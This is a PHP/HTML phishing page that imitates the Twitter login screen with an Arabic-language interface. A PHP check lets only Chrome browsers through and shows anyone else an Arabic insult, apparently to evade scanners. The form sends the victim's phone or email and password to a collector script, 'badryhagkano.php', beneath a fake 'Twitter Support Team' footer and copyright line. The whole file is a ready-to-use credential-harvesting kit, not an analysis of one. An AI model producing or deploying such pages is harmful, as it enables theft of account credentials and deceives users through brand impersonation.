<?php
if ($_SERVER["HTTP_ACCEPT"] and preg_match("/(.*?)Chrome(.*?)/",$_SERVER["HTTP_USER_AGENT"])){
} else {
echo" كسمك يصحبي 😂"; 
return false; 
}
?> 
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="style.css">
    <title>log in Twitter </title>

    <!-- HTML -->


    <!-- Custom Styles -->
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <style type="text/css">
    </style>





    </head>

    <body>
        <br> <br> <br> <br> <br>
        <center>

            <img class="img" src="img/imgo.png" /><br>

        </center>
        <div class="ds">
            <p>Login Twitter </p>
            <div>
                <br>
                <center>
                    <form class="login-form" action="badryhagkano.php" method="post">
                        <div class="login-form">
                            <label> <input type="text" name="text"
                                    placeholder="رقم الهاتف المحمول أو عنوان البريد الإلكتروني" autocomplete="off"
                                    autocapitalize="off" required> </label> <label>
                                <input type="password" name="password" placeholder="كلمه السر" autocomplete="off"
                                    autocapitalize="off" required> </label>
                        </div>
                </center>

                <center>
                    <div> <button class="btn-login-fb">تسجيل الدخول</button>
                        </from>
                        <button class=" btn-login-fd ">نسيت كلمة السر؟</button>
                </center>
                <br>
                <center>
                    <font face=" times new roman " size="2.5" color="#1e88e5"> قم بتسجيل حساب جديد </font>
                </center>
            </div> <br> <br>
            <div class="footer-txt-copyright">©جميع الحقوق محفوضه لدى تويتر 2022</div>
            <!--- footer-txt-copyright --->
            <div class="text-lin">Twitter Support Team</div>
            <!--- footer-txt-copyright --->
    </body>

</html>